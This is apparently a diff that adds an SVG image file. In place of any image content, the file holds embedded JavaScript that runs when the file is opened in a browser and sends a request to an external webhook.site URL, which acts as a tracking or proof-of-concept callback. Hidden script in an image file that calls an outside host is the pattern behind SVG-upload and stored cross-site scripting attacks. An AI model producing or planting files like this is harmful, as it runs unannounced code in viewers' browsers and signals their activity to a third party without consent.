@@ -1,0 +1,18 @@
+<svg width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script type="text/javascript">
+    <![CDATA[
+      // This script will execute when the SVG is viewed in a browser
+      (function() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://webhook.site/e4824039-d521-41c6-9481-23dfa5954926', true);
+        xhr.send();
+        
+        // Optional: show that the request was made
+        var style = document.createElementNS("http://www.w3.org/2000/svg", "style");
+        style.textContent = ".success { fill: green; } .pending { fill: orange; }";
+        document.documentElement.appendChild(style);
+      })();
+    ]]>
+  </script>
+  
+</svg>
